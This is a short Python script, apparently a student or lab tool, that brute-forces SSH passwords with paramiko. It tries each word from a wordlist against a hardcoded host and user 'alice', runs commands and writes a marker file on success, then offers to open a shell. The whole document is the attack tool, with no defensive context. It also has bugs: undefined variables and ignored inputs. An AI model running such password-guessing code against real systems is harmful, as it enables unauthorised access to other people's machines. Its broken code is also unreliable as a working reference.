import paramiko
import time
import socket
import os

hostname, username, wordlist = input("Please enter the host, user and wordlist. Enter like this(Host, user, wordlist)\n").split(", ")
wordlist = open(wordlist, "r")


def try_connect(host, user, password):
    """This function is used to try to connect through ssh:
1) It will try to connect using the hostname, username and a word from the wordlist through ssh
  a) If the coonection works it will try the ls command and then create a file and then return true
  b) If it failes at any point it will return false

2) It will then tell the user whether it was a success or it was unsuccessful"""

    client = paramiko.SSHClient()
    result = False 
    try:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #This is there to tell it what to do if it cant finds the ssh hostname and in this case it will automaticly add a policy 
        client.connect(host, 22, user, password) #This will try to connect using the hostname, port, username, password

        #Trys doing the ls command in linux and then makes a file called Gained_Access and write to it
        client.exec_command("ls")
        client.exec_command("echo The program has find the password and wrote to a file > Gained_Access.txt")

        result = True
    #If it fails at any point including unauthorised and socket it will return false so that means it hasnt got the password   
    except :
        result = False 
    finally:
        client.close()
    return result


#Clears the txt file  
with open("Progress_report.txt", "a") as progress:
    progress.truncate(0)   

#Skips the top ten values of the wordlist
for x in range(0, 10):
    next(dic)

with open("Progress_report.txt", "a") as progress:
    progress.write("Words that have been tested:\n")   

for keyword in wordlist: #Goes throught the words in the wordlist
    startTime = datetime.datetime.now() #Takes the time 
    wordsleft -= 1 #Takes off  everytime it goes through a word
    
    #Trys to conduct the if statement
    try:
        if try_connect("192.168.33.10", "alice", keyword.strip("\n")) == True: #Runs the try_connect function and then will complete if it returns true
            print ("Connection status: Success >", keyword.strip("\n")) #Tells the user its a success
            print ("The Password is:", keyword.strip("\n")) #Tells them the password
            awnser = input("Would you like to connect? ") #Asked the user if they want to connect

            #If yes then executes the connect command by doing ssh alice@192.168.33.10 then typing the password
            if awnser.lower() == "y" or awnser.lower() == "yes": 
                os.system('cmd /k "ssh alice@192.168.33.10"')
                break

        else:
            endTime = str(str((datetime.datetime.now() - startTime)*wordsleft).split(".")[0]) #Ends the timer by checking the time and then working out how long it took and times it by the amount of words left

            #Prints that it failed connecting the worst time from them it would take and the amount of words left
            print(("Connection status: Unsuccess > " + keyword.strip("\n")).ljust(50)+ ("  Worst Time: " + endTime).rjust(25) + "   Words left: "+ str(wordsleft)+"/27414")
        with open("Progress_report.txt", "a") as progress:
            progress.write("Tried: " +keyword)
            
    #Stops and writes if there is an error in the running
    except:

        #Writes word of the words that had been tested and there was an error
        with open("Progress_report.txt", "a") as progress:
            progress.write("\nError was on: " + keyword)
        break



        
    
    
        


